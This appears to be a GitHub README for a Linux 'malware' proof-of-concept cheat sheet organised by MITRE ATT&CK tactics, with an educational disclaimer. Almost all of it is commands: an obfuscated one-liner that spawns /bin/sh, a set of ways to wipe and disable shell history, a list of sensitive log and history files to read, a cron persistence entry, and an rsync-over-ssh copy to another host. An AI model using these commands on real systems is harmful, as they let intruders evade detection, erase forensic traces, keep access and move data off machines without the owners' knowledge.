
> Disclaimer: This project is for Educational Purpose Only


# malware-kiddie-linux
This repository stores the proof-of-concept of Linux malware.

For Windows, please visit [malware-kiddie-windows](https://github.com/g4xyk00/malware-kiddie-windows)
- - - -

## Defense Evasion

```bash
____=$-
____(){ __=$#;};____ $#;_=$__;
/?${____:$__:$__}?/${____:$__+$__+$__+$__+$__:$__}${____:$#:$__}
```

| Command | Output |
| --- | --- |
| `-` | himBHs |
| `$__` (After assignment) | 1 | 
| `$____` (After assignment) | himBHs | 
| `/?${____:1:1}?/${____:5:1}${____:0:1}` | /bin/sh |
| `/?${____:$__:$__}?/${____:$__+$__+$__+$__+$__:$__}${____:$#:$__}` | /bin/sh |


**Clear Command History ([T1146](https://attack.mitre.org/techniques/T1146/))**

```bash
 <command started with space character>

HISTFILE=/dev/null
HISTSIZE=0
HISTFILESIZE=0

export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0

unset HISTFILE
set +o history
shopt -ou history
history -c

shred $HISTFILE
shred -zu $HISTFILE

kill -9 $$

<any command that generate long output, e.g. netstat> | more
!<commands>
```

- - - -
## Discovery
**File and Directory Discovery ([T1083](https://attack.mitre.org/techniques/T1083/))**

* /home/$USERNAME/.bash_history 
* /root/.bash_history
* /var/log/auth.log
* /var/www/html/access.log

- - - - 
## Persistence
**Local Job Scheduling ([T1168](https://attack.mitre.org/techniques/T1168/))**
```bash
crontab -e
0 */12 * * * <command>
```

- - - - 

## Lateral Movement
**Remote File Copy ([T1105](https://attack.mitre.org/techniques/T1105/))**

```bash
rsync -a /src/directory /dest/directory
rsync -avze ssh /src/directory/ user@192.168.56.1:dest/directory
```
